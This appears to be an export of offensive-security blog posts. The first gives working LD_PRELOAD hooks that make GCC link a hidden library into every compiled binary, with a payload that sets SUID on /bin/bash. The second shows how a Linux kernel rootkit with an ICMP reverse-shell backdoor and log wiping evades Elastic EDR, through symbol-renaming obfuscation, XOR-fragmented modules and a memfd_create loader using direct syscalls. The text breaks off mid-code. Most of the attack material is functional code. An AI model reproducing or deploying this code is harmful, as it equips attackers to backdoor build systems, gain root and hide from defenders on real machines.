https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd 